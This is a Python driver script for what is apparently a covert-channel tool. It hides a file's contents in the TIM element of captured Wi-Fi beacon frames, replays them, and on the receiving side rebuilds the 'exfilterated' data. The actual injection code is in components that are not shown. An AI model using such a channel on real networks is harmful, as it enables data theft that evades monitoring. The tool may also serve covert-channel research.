import os
import sys
from pathlib import Path
from pathlib import Path
from components.file_chunker import FileChunker
from components.beacon_frame_processor import BeaconFrameProcessor
from components.pvb_maker import PVBMaker

def main():
    if len(sys.argv) != 4:
        print("Usage: python main.py <transmit|receive> <filename>  <interface>")
        sys.exit(1)

    mode = sys.argv[1]
    filename = sys.argv[2]
    interface = sys.argv[3]

    if mode not in ["transmit", "receive"]:
        print("Invalid mode. Use 'transmit' or 'receive'.")
        sys.exit(1)

    if mode == "transmit":
        transmit(filename, interface)
    else:
        receive(filename, interface)

def transmit(filename, interface):
    print(f"Transmitting file: {filename}")
    chunker = FileChunker(filename)
    chunks = chunker.read_and_chunk()
    pvb_array_maker = PVBMaker(chunks)
    pvb_array = pvb_array_maker.do()
    sniffer = BeaconFrameProcessor(interface)
    sniffer.capture_beacon_frames(timeout=10)  # Capture unique beacon frames for 20 seconds
    sniffer.inject_tim_element(pvb_array)
    sniffer.read_tim_element()  #Debugging - check that things look ok
    sniffer.replay_beacon_frames()


def receive(filename, interface):
    print(f"Receiving file: {filename}")
    receiver = BeaconFrameProcessor(interface)
    receiver.receive_exfilterated_data(timeout=10)
    receiver.write_file(filename)

if __name__ == "__main__":
    main()
